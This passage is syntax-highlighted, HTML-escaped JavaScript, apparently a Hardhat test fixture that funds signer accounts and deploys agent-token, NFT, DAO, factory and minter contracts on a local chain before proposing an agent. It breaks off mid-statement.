class=\"grvsc-source\"\u003e  const getAccounts = async () =\u0026gt; {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const [deployer, ipVault, founder, poorMan, trader, treasury, randomAddr] = await ethers.getSigners();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Fund all accounts with ETH for gas (10 ETH each)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const fundAccounts = [deployer, ipVault, founder, poorMan, trader, treasury];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    for (const account of fundAccounts) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await setBalance(account.address, parseEther(\u0026quot;10\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { deployer, ipVault, founder, poorMan, trader, treasury, randomAddr };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployBaseContracts() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { deployer, ipVault, treasury } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setting up environment variables if not present in the actual .env\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // This is for testing purposes only\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.TBA_IMPLEMENTATION) process.env.TBA_IMPLEMENTATION = ethers.ZeroAddress;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.DATASET_SHARES) process.env.DATASET_SHARES = \u0026quot;1000\u0026quot;; // 10%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.UNISWAP_ROUTER) process.env.UNISWAP_ROUTER = \u0026quot;0x8aEF2b5C33686F8621A17B9Aaff079E7d8D673f9\u0026quot;; // Base mainnet Uniswap router\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_LIMIT) process.env.AGENT_TOKEN_LIMIT = parseEther(\u0026quot;10000000\u0026quot;).toString(); // 10M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_LP_SUPPLY) process.env.AGENT_TOKEN_LP_SUPPLY = parseEther(\u0026quot;5000000\u0026quot;).toString(); // 5M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.AGENT_TOKEN_VAULT_SUPPLY) process.env.AGENT_TOKEN_VAULT_SUPPLY = parseEther(\u0026quot;2000000\u0026quot;).toString(); // 2M\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.BOT_PROTECTION) process.env.BOT_PROTECTION = \u0026quot;100\u0026quot;; // 1%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.TAX) process.env.TAX = \u0026quot;500\u0026quot;; // 5%\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    if (!process.env.SWAP_THRESHOLD) process.env.SWAP_THRESHOLD = parseEther(\u0026quot;10\u0026quot;).toString(); // 10 tokens\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying VirtualToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const virtualToken = await ethers.deployContract(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;VirtualToken\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [PROPOSAL_THRESHOLD, deployer.address],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`VirtualToken deployed at ${virtualToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ERC6551Registry Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tbaRegistry = await ethers.deployContract(\u0026quot;ERC6551Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await tbaRegistry.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deployed ERC6551Registry Registry\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentNftV2...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const AgentNft = await ethers.getContractFactory(\u0026quot;AgentNftV2\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentNft = await upgrades.deployProxy(AgentNft, [deployer.address]);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentNftV2 deployed at ${agentNft.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ContributionNft...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const contribution = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;ContributionNft\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [agentNft.target],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`ContributionNft deployed at ${contribution.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying ServiceNft...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const service = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;ServiceNft\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [agentNft.target, contribution.target, process.env.DATASET_SHARES],\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      {}\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`ServiceNft deployed at ${service.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.setContributionService(contribution.target, service.target);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Set contribution and service on AgentNft\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Implementation contracts\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.deployContract(\u0026quot;AgentToken\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentToken deployed at ${agentToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentDAO...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentDAO = await ethers.deployContract(\u0026quot;AgentDAO\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentDAO.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentDAO deployed at ${agentDAO.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentVeToken...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentVeToken = await ethers.deployContract(\u0026quot;AgentVeToken\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentVeToken.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentVeToken deployed at ${agentVeToken.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying AgentFactoryV2...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentFactory = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;AgentFactoryV2\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentVeToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentDAO.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tbaRegistry.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        virtualToken.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        PROPOSAL_THRESHOLD,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        deployer.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`AgentFactoryV2 deployed at ${agentFactory.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentNft.grantRole(await agentNft.MINTER_ROLE(), agentFactory.target);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Granted MINTER_ROLE to AgentFactory\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Deploying Minter...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const minter = await upgrades.deployProxy(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await ethers.getContractFactory(\u0026quot;Minter\u0026quot;),\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        service.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        contribution.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentNft.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        1e12,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        20,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ipVault.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        agentFactory.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        deployer.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        1e10,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      ]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await minter.waitForDeployment();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(`Minter deployed at ${minter.target}`);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Setting parameters on AgentFactory...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setMaturityDuration(86400 * 365 * 10); // 10years\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setUniswapRouter(process.env.UNISWAP_ROUTER);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenAdmin(deployer.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenSupplyParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LP_SUPPLY,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_VAULT_SUPPLY,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.AGENT_TOKEN_LIMIT,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.BOT_PROTECTION,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      minter.target\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await agentFactory.setTokenTaxParams(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.TAX,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.TAX,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      process.env.SWAP_THRESHOLD,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      treasury.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;AgentFactory parameters set\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    return { virtualToken, agentFactory, agentNft, minter, tbaRegistry };\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  async function deployWithApplication() {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await deployBaseContracts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentFactory, virtualToken, tbaRegistry } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Prepare tokens for proposal\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Minting VirtualToken for founder...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(founder.address, PROPOSAL_THRESHOLD);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(agentFactory.target, PROPOSAL_THRESHOLD);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003econsole.log(\u0026quot;Proposing agent...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const tx = await agentFactory\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .proposeAgent(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.name,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.symbol,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.tokenURI,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.cores,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.tbaSalt,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tbaRegistry.target,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.daoVotingPeriod,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        genesisInput.daoThreshold\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await tx.wait();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const filter = agentFactory.filters.NewApplication;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const events = await agentFactory.queryFilter(filter, -1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const event = events[0];\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { id } = 